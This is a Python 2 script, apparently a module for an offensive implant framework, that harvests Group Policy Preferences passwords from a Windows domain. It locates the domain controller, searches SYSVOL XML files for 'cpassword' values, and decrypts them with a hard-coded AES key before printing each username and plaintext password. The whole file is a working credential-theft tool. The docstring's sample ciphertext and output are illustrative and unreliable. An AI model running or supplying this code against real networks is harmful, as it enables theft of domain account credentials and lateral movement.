
import ops.cmd
import dsz.version, dsz.path, dsz.control, dsz.lp
import sys
import defusedxml.minidom

def main():
    """Function:
    def main():
        This function checks if the current machine is part of a domain and searches for .xml files in the SYSVOL share for credentials stored in the cpassword field.
        Parameters:
            - None
        Returns:
            - None
        Processing Logic:
            - Checks if the machine is part of a domain.
            - Searches for .xml files in the SYSVOL share.
            - Parses the .xml files for credentials stored in the cpassword field."""
    
    found = False
    dcName = ''
    domainName = ''
    try:
        myCommand = ops.cmd.getDszCommand('domaincontroller -primary')
        cmdRes = myCommand.execute()
        dcName = cmdRes.domaincontroller[0].dcname
        domainName = cmdRes.domaincontroller[0].domainname
        ops.info(('The dc is %s for %s' % (dcName, domainName)))
    except:
        ops.error('This machine does not appear to be part of the domain')
        quit()
    sharePath = ('SYSVOL\\' + domainName)
    fullShare = ((dcName + '\\') + sharePath)
    myCommand = ops.cmd.DszCommand('grep', pattern='cpassword', path=fullShare, mask='*xml', recursive=True)
    cmdRes = myCommand.execute()
    for xmlfile in cmdRes.file:
        if xmlfile.line:
            for ret_value in xmlfile.line:
                if ('cpassword' in ret_value.value):
                    found = True
                    parsexml(ret_value.value)
            if (not found):
                ops.info('Failed to find any .xml files in sysvol with creds stored')

def decrypt(encpass):
    """Decrypts an encrypted password using AES encryption.
    Parameters:
        - encpass (str): The encrypted password to be decrypted.
    Returns:
        - str: The decrypted password.
    Processing Logic:
        - Import necessary modules.
        - Calculate the number of padding characters needed.
        - Add padding characters if necessary.
        - Decode the encrypted password.
        - Define the AES key.
        - Attempt to decrypt the password.
        - Remove any padding characters and null bytes.
        - Return the decrypted password.
    Example:
        decrypt('R9s8d7f6g5h4j3k2l1=')
        # Output: 'password123'"""
    
    sys.path.append('C:\\python27\\lib\\site-packages')
    import Crypto.Cipher.AES, codecs
    dc = codecs.getdecoder('Base64')
    mod = ((4 - (len(encpass[0]) % 4)) % 4)
    if (not (mod == 0)):
        encpass += ('=' * mod)
    decode_encpass = dc(encpass)
    AESKey = 'N\x99\x06\xe8\xfc\xb6l\xc9\xfa\xf4\x93\x10b\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05y\x90 \x9b\t\xa43\xb6l\x1b'
    try:
        test = Crypto.Cipher.AES.new(AESKey, Crypto.Cipher.AES.MODE_CBC, ('\x00' * Crypto.Cipher.AES.block_size))
        res = test.decrypt(decode_encpass[0])
    except Exception as e:
        ops.error(e)
        quit()
    clean_res = res.strip('\x10').replace('\x00', '')
    return clean_res

def parsexml(xmlstring):
    """Parses an XML string and extracts user data and properties.
    Parameters:
        - xmlstring (str): A string containing XML data.
    Returns:
        - None: This function does not return anything.
    Processing Logic:
        - Parse XML string using defusedxml.
        - Get user data and properties.
        - Loop through user data and extract name and encrypted password.
        - Decrypt password using decrypt() function.
        - Print user data and decrypted password."""
    
    data = defusedxml.minidom.parseString(xmlstring)
    userdata = data.getElementsByTagName('User')
    properties = data.getElementsByTagName('Properties')
    for i in xrange(0, len(userdata)):
        name = userdata[i].getAttribute('name')
        cpassword = properties[i].getAttribute('cpassword')
        decpassword = decrypt(cpassword)
        ops.info(('Name: %s\tPassword: %s' % (name, decpassword)))
if (__name__ == '__main__'):
    main()
